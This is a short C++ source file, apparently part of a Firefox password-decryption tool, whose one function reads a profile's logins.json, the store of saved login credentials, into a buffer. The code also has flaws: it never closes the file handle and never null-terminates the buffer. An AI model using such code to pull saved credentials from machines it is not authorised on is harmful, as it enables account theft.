#include"Firefox_decrypt.h"
// 获取logins.json中保存的登录信息
char* getBuffer(string profilePath) {
	profilePath = profilePath + "\\logins.json";

	DWORD szBuffer = 100000, szWrotedBytes;
	char* buffer = (char*)malloc(szBuffer);
	HANDLE fLoginFile = CreateFileA(profilePath.c_str(), GENERIC_READ,FILE_SHARE_READ | FILE_SHARE_WRITE | FILE_SHARE_DELETE, NULL, OPEN_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);	// 打开文件logins.json，成功返回句柄
	if (fLoginFile != INVALID_HANDLE_VALUE) {
		if(!(ReadFile(fLoginFile, buffer, szBuffer, &szWrotedBytes, NULL)))	// 读取内容到缓冲区
			printf("File read failed!..\n");
		//printf("%s,\n", buffer);
	}
	else {
		printf("File cannot found!..\n");
	}
	return buffer;
}